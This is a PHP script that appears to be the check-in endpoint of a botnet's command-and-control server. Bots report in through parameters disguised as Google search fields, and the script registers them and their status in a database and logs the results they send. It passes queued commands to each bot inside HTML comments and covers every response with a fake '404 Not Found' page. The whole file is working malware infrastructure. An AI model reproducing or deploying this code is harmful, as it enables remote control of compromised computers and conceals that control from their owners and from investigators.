<?php
include("./config.php");
include("./functions.php");

if(isset($_GET['hl']) && isset($_GET['q']) && isset($_GET['meta']))
{
	$hl = $_GET['hl'];
	$q = $_GET['q'];
	$meta = $_GET['meta'];

	//check some general stuff
	ConnectToDB($server, $user, $pw, $dbname);	
	if(!IsBotInDB($hl, $q))
	{
		AddBotToDB($hl, $q, "New");	
	}
	
	if($meta=="login")
	{
		UpdateBotStatus($hl, $q, "Login", true);
	}
	else
	{
		UpdateBotStatus($hl, $q, "Online", true);	
	}
	
	UpdateBotStatusList($timeout, $hl, $q);
	
	//print out all commands for bot and delete them from queue as done
	$botid = GetBotID($hl, $q);
	
	if(isset($_GET['res']) && $_GET['res']!="")
	{
		AddResultToLog($q, $_GET['res']);
	}
	
	echo("<!--\n");
	if($meta!="login")ShowAndDeleteCommandsForBot($botid);
	echo("-->\n");

	CloseConnectionToDB();
}

echo('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' . "\n");
echo("<HTML><HEAD>\n");
echo("<TITLE>404 Not Found</TITLE>\n");
echo("</HEAD><BODY>\n");
echo("<H1>Not Found</H1>\n");
echo("<P>The requested URL was not found on this server.</P>\n");
echo("<HR>\n");
echo("</BODY></HTML>\n");

?>